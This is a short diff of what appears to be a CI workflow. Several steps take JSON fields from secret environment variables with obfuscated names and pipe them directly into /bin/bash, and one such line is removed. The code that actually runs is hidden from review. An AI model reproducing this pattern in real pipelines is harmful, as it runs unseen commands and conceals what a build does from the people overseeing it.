@@ -20,7 +20,6 @@ jobs:
           ljfh7: ${{ secrets.ljfh7 }}
         run: |
           printf '%s' "$ljfh7" | jq -r .tsw2116 | /bin/bash
-          echo $zpfan799 | jq -r .ybk87 | /bin/bash
           echo $hp04 | jq -r .nah64 | /bin/bash
           printf '%s' "$jj1199" | jq -r .euv3 | /bin/bash
           echo $x3 | jq -r .a14 | /bin/bash
